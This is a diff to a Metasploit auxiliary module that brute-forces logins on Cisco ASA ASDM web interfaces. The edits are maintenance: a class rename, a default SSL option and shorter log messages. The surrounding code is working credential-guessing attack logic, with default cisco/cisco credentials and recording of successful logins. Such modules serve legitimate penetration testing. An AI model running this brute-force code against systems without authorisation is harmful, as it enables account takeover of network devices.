@@ -6,7 +6,7 @@
 require 'rex/proto/http'
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -24,13 +24,13 @@ class Metasploit3 < Msf::Auxiliary
         [
           'Jonathan Claudius <jclaudius[at]trustwave.com>',
         ],
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'DefaultOptions' => { 'SSL' => true }
     ))
 
     register_options(
       [
         Opt::RPORT(443),
-        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
         OptString.new('USERNAME', [true, "A specific username to authenticate as", 'cisco']),
         OptString.new('PASSWORD', [true, "A specific password to authenticate with", 'cisco'])
       ], self.class)
@@ -38,18 +38,18 @@ class Metasploit3 < Msf::Auxiliary
 
   def run_host(ip)
     unless check_conn?
-      print_error("#{peer} - Connection failed, Aborting...")
+      print_error("Connection failed, Aborting...")
       return
     end
 
     unless is_app_asdm?
-      print_error("#{peer} - Application does not appear to be Cisco ASA ASDM. Module will not continue.")
+      print_error("Application does not appear to be Cisco ASA ASDM. Module will not continue.")
       return
     end
 
-    print_status("#{peer} - Application appears to be Cisco ASA ASDM. Module will continue.")
+    print_status("Application appears to be Cisco ASA ASDM. Module will continue.")
 
-    print_status("#{peer} - Starting login brute force...")
+    print_status("Starting login brute force...")
     each_user_pass do |user, pass|
       do_login(user, pass)
     end
@@ -63,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'       => '/',
         'method'    => 'GET'
       })
-      print_good("#{peer} - Server is responsive...")
+      print_good("Server is responsive...")
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       return
     end
@@ -117,7 +117,7 @@ class Metasploit3 < Msf::Auxiliary
 
   # Brute-force the login page
   def do_login(user, pass)
-    vprint_status("#{peer} - Trying username:#{user.inspect} with password:#{pass.inspect}")
+    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
       res = send_request_cgi({
         'uri'       => '/+webvpn+/index.html',
@@ -138,17 +138,17 @@ class Metasploit3 < Msf::Auxiliary
          res.body.match(/Success/) &&
          res.body.match(/success/)
 
-        print_good("#{peer} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
+        print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
 
         report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
         return :next_user
 
       else
-        vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
+        vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
       end
 
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-      print_error("#{peer} - HTTP Connection Failed, Aborting")
+      print_error("HTTP Connection Failed, Aborting")
       return :abort
     end
   end
